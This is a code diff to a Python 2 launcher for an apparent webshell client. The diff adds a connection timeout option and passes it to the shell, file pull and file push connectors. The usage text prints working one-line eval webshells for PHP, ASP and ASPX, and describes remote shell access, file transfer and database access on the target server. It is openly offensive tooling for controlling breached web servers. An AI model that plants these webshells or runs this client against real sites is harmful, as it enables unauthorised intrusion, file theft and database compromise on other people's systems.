@@ -36,6 +36,7 @@ class Launcher(object):
         print '  -u+        Specify the target URL'
         print '  -s+        Specify the type of server: php/asp/aspx/jsp'
         print '  -p+        Connection password (Command parameter name)'
+        print '  -t 7       Connection timeout in sec (default: 7 sec)'
         print ''
         print '  --shell    Get a web based shell on the console'
         print '  --pull+    Download file to local: -- pull remote_path local_path / --pull remote_path'
@@ -53,7 +54,7 @@ class Launcher(object):
         print '             -u http://localhost/shell.php -s php -p cmd --db mysql'
         print ''
         print 'Webshell samples:'
-        print '  PHP:       <?php @eval($_REQUEST[\'cmd\']);?>'
+        print '  PHP:       <?php @eval($_REQUEST["cmd"]);?>'
         print '  ASP:       <%eval request("cmd")%>'
         print '  ASPX:      <%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'
         print ''
@@ -64,12 +65,13 @@ class Launcher(object):
     @classmethod
     def getConfig(self):
         try:
-            opts, args = getopt.getopt(sys.argv[1:], 'u:p:s:', ['shell', 'pull', 'push', 'db'])
+            opts, args = getopt.getopt(sys.argv[1:], 'u:p:s:t:', ['shell', 'pull', 'push', 'db'])
         except:
             return 'error'
         config = {
             'url': '',
             'password': '',
+            'timeout': 7,
             'server': '',
             'shell': False,
             'pull': [],
@@ -81,6 +83,8 @@ class Launcher(object):
                 config['url'] = value
             elif option == '-p':
                 config['password'] = value
+            elif option == '-t':
+                config['timeout'] = int(value)
             elif option == '-s':
                 config['server'] = value
             elif option == '--shell':
@@ -124,11 +128,11 @@ class Launcher(object):
     @classmethod
     def getConnector(self, config):
         if config['shell'] == True:
-            connector = WebShellConnector(config['url'], config['password'], config['server'])
+            connector = WebShellConnector(config['url'], config['password'], config['server'], config['timeout'])
         elif len(config['pull']) > 0:
-            connector = PullConnector(config['url'], config['password'], config['server'], config['pull'])
+            connector = PullConnector(config['url'], config['password'], config['server'], config['pull'], config['timeout'])
         elif len(config['push']) > 0:
-            connector = PushConnector(config['url'], config['password'], config['server'], config['push'])
+            connector = PushConnector(config['url'], config['password'], config['server'], config['push'], config['timeout'])
         elif config['database'] == 'mysql' or config['database'] == 'sqlserver' or config['database'] == 'oracle' or config['database'] == 'access':
             print '+ Enter database configuration'
             host = raw_input('+ Database host: ')
